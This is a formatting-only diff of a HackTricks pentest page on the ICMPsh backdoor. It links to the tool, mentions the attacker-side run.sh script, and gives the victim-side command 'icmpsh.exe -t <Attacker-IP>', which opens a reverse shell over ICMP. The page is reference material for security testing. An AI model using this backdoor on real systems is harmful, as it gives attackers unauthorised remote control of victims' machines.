@@ -1,4 +1,4 @@
-# ICMPsh
+
 
 <details>
 
@@ -16,9 +16,10 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 
 </details>
 
+
 Download the backdoor from: [https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)
 
-## Client side
+# Client side
 
 Execute the script: **run.sh**
 
@@ -36,13 +37,15 @@ echo Please insert the IP where you want to listen
 read IP
 ```
 
-## **Victim Side**
+# **Victim Side**
 
 Upload **icmpsh.exe** to the victim and execute:
 
 ```bash
 icmpsh.exe -t <Attacker-IP> -d 500 -b 30 -s 128
 ```
+
+
 
 <details>
 
@@ -59,3 +62,5 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 **Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**
 
 </details>
+
+
